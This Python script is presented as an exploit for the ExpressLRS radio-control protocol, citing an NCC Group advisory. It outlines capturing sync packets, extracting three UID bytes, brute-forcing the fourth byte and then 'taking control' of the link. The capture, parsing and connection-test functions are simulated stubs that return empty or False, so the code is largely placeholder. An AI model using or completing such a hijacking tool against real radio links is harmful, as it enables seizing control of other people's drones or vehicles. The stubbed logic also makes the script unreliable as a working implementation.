#!/usr/bin/env python3
"""
ExpressLRS UID Leakage Exploit Script
Exploits ExpressLRS protocol vulnerabilities to leak UID and brute force control

HARDWARE REQUIREMENTS:
- Software-Defined Radio (SDR) device required
- Recommended: HackRF One (~$100-150)
- Alternative: BladeRF 2.0 Micro or LimeSDR Mini
- See HARDWARE_REQUIREMENTS.md for detailed hardware information
"""

import sys
import socket
import struct
import time
from typing import Optional, Tuple

def capture_expresslrs_packets(interface: str, duration: int = 30):
    """
    Capture ExpressLRS packets from network interface
    
    Args:
        interface: Network interface in monitor mode
        duration: Capture duration in seconds
    
    Returns:
        List of captured packets
    """
    print(f"[*] Capturing ExpressLRS packets on {interface} for {duration} seconds...")
    
    try:
        import subprocess
        
        # Use tcpdump or similar to capture packets
        # ExpressLRS typically uses 2.4GHz ISM band
        # This is a simplified capture - real implementation would need
        # SDR or specialized hardware
        
        print("[!] ExpressLRS capture requires:")
        print("    - ExpressLRS-compatible transmitter/receiver")
        print("    - Packet capture on 2.4GHz ISM band")
        print("    - Specialized ExpressLRS packet analysis")
        print("[*] Simulating packet capture...")
        
        # In real implementation, this would:
        # 1. Capture radio packets using SDR or specialized hardware
        # 2. Parse ExpressLRS packet structure
        # 3. Extract sync packets containing UID bytes
        
        time.sleep(2)  # Simulate capture time
        
        # Simulated captured packets
        packets = []
        print("[+] Packet capture complete (simulated)")
        
        return packets
        
    except Exception as e:
        print(f"[-] Error capturing packets: {e}")
        return []

def extract_uid_from_sync_packet(packet: bytes) -> Optional[Tuple[int, int, int]]:
    """
    Extract UID bytes from ExpressLRS sync packet
    
    Args:
        packet: Raw packet bytes
    
    Returns:
        Tuple of (byte1, byte2, byte3) or None
    """
    # ExpressLRS sync packets leak the last 3 bytes of the 4-byte UID
    # This is a simplified extraction - real implementation requires
    # detailed knowledge of ExpressLRS packet structure
    
    if len(packet) < 4:
        return None
    
    # Simplified: assume last 3 bytes of packet contain UID bytes
    # Real implementation would parse ExpressLRS packet structure
    try:
        byte1 = packet[-3] if len(packet) >= 3 else 0
        byte2 = packet[-2] if len(packet) >= 2 else 0
        byte3 = packet[-1] if len(packet) >= 1 else 0
        return (byte1, byte2, byte3)
    except:
        return None

def brute_force_uid(known_bytes: Tuple[int, int, int], test_connection_func) -> Optional[bytes]:
    """
    Brute force the remaining UID byte
    
    Args:
        known_bytes: Known UID bytes (3 bytes)
        test_connection_func: Function to test if UID is correct
    
    Returns:
        Full 4-byte UID or None
    """
    print(f"[*] Brute forcing remaining UID byte...")
    print(f"[*] Known bytes: {known_bytes[0]:02x} {known_bytes[1]:02x} {known_bytes[2]:02x}")
    print(f"[*] Testing 256 possibilities...")
    
    for first_byte in range(256):
        full_uid = bytes([first_byte, known_bytes[0], known_bytes[1], known_bytes[2]])
        
        if first_byte % 32 == 0:
            print(f"\r[*] Progress: {first_byte}/256 ({first_byte*100//256}%)", end='', flush=True)
        
        # Test if this UID works
        # In real implementation, this would attempt to connect with ExpressLRS
        # using this UID and check if connection succeeds
        
        # Simulated test
        if test_connection_func(full_uid):
            print(f"\n[+] Found UID: {full_uid.hex()}")
            return full_uid
    
    print("\n[-] Failed to find correct UID")
    return None

def test_expresslrs_uid(uid: bytes) -> bool:
    """
    Test if ExpressLRS UID is correct
    
    Args:
        uid: 4-byte UID to test
    
    Returns:
        True if UID is correct
    """
    # In real implementation, this would:
    # 1. Attempt to connect to ExpressLRS receiver using this UID
    # 2. Check if connection is accepted
    # 3. Verify if control commands are accepted
    
    # For simulation, we'll use a simple check
    # Real implementation requires ExpressLRS protocol knowledge
    
    return False  # Simulated

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 expresslrs_uid_leakage.py <interface> [known_bytes]")
        print("Example: python3 expresslrs_uid_leakage.py wlan0mon")
        print("Example: python3 expresslrs_uid_leakage.py wlan0mon 0x12 0x34 0x56")
        print("\nExpressLRS UID Leakage Attack")
        print("NCC Group Technical Advisory")
        print("\nThis exploit:")
        print("  1. Captures ExpressLRS sync packets (leak 75% of UID)")
        print("  2. Extracts 3 bytes of UID from sync packets")
        print("  3. Brute forces remaining 1 byte (256 possibilities)")
        print("  4. Uses discovered UID to take control")
        print("\nWARNING: Requires ExpressLRS-compatible hardware and packet capture")
        sys.exit(1)
    
    interface = sys.argv[1]
    known_bytes = None
    
    if len(sys.argv) > 2:
        # Parse known bytes
        try:
            byte1 = int(sys.argv[2], 16) if sys.argv[2].startswith('0x') else int(sys.argv[2])
            byte2 = int(sys.argv[3], 16) if sys.argv[3].startswith('0x') else int(sys.argv[3])
            byte3 = int(sys.argv[4], 16) if sys.argv[4].startswith('0x') else int(sys.argv[4])
            known_bytes = (byte1, byte2, byte3)
        except (ValueError, IndexError):
            print("[-] Invalid byte format. Use hex (0x12) or decimal (18)")
            sys.exit(1)
    
    print("[*] ExpressLRS UID Leakage Attack")
    print("[*] NCC Group Technical Advisory")
    print()
    
    if known_bytes:
        print(f"[*] Using provided known bytes: {known_bytes}")
    else:
        # Capture packets to extract UID bytes
        print("[*] Step 1: Capturing ExpressLRS sync packets...")
        packets = capture_expresslrs_packets(interface, duration=30)
        
        if not packets:
            print("[-] No packets captured. Cannot proceed.")
            print("[!] This exploit requires:")
            print("    - ExpressLRS-compatible hardware")
            print("    - Packet capture on 2.4GHz ISM band")
            print("    - Active ExpressLRS communication to observe")
            sys.exit(1)
        
        # Extract UID bytes from sync packets
        print("[*] Step 2: Extracting UID bytes from sync packets...")
        known_bytes = None
        for packet in packets:
            uid_bytes = extract_uid_from_sync_packet(packet)
            if uid_bytes:
                known_bytes = uid_bytes
                break
        
        if not known_bytes:
            print("[-] Failed to extract UID bytes from packets")
            sys.exit(1)
    
    # Brute force remaining byte
    print("[*] Step 3: Brute forcing remaining UID byte...")
    full_uid = brute_force_uid(known_bytes, test_expresslrs_uid)
    
    if full_uid:
        print(f"\n[+] UID discovered: {full_uid.hex()}")
        print("[+] You can now use this UID to connect and take control")
        print("[!] Use ExpressLRS tools to connect with discovered UID")
    else:
        print("\n[-] Failed to discover UID")
        print("[!] This may indicate:")
        print("    - Incorrect known bytes")
        print("    - Target not using ExpressLRS")
        print("    - Connection testing function needs implementation")
        sys.exit(1)

if __name__ == "__main__":
    main()
